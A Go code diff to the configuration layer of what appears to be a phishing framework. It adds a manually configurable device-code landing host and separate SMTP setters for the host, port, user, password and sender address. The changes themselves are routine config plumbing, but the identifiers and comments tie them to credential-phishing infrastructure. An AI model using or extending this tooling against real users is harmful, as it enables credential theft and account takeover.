@@ -5,6 +5,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 
 	"github.com/x-tymus/x-tymus/log"
@@ -132,6 +133,7 @@ type GeneralConfig struct {
 	SmtpUser             string `mapstructure:"smtp_user" json:"smtp_user" yaml:"smtp_user"`
 	SmtpPass             string `mapstructure:"smtp_pass" json:"smtp_pass" yaml:"smtp_pass"`
 	SmtpFrom             string `mapstructure:"smtp_from" json:"smtp_from" yaml:"smtp_from"`
+	DCLandingHost        string `mapstructure:"dc_landing_host" json:"dc_landing_host" yaml:"dc_landing_host"`
 }
 
 type DNSEntry struct {
@@ -1031,10 +1033,13 @@ func (c *Config) GetBaseDomain() string {
 }
 
 // GetDCLandingHost returns the HTTPS hostname to use for device-code landing
-// page URLs.  It prefers the first enabled phishlet's landing subdomain (which
-// is always in activeHostnames and has a TLS cert) over the bare root domain,
-// which is never registered with certmagic and therefore causes TLS failures.
+// page URLs. Prefers manually configured DCLandingHost, then the first enabled
+// phishlet's landing subdomain (which is always in activeHostnames and has a TLS cert),
+// falling back to the bare root domain.
 func (c *Config) GetDCLandingHost() string {
+	if c.general.DCLandingHost != "" {
+		return c.general.DCLandingHost
+	}
 	sites := c.GetEnabledSites()
 	for _, site := range sites {
 		pl, err := c.GetPhishlet(site)
@@ -1200,5 +1205,37 @@ func (c *Config) GetSmtpFrom() string  { return c.general.SmtpFrom }
 func (c *Config) SetSmtp(host string, port int, user, pass, from string) {
 	c.general.SmtpHost = host; c.general.SmtpPort = port
 	c.general.SmtpUser = user; c.general.SmtpPass = pass; c.general.SmtpFrom = from
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSmtpHost(host string) {
+	c.general.SmtpHost = host
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSmtpPort(portStr string) {
+	if port, err := strconv.Atoi(portStr); err == nil && port > 0 {
+		c.general.SmtpPort = port
+		c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+	}
+}
+
+func (c *Config) SetSmtpUser(user string) {
+	c.general.SmtpUser = user
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSmtpPass(pass string) {
+	c.general.SmtpPass = pass
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSmtpFrom(from string) {
+	c.general.SmtpFrom = from
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
+
+func (c *Config) SetDCLandingHost(host string) {
+	c.general.DCLandingHost = host
 	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
 }
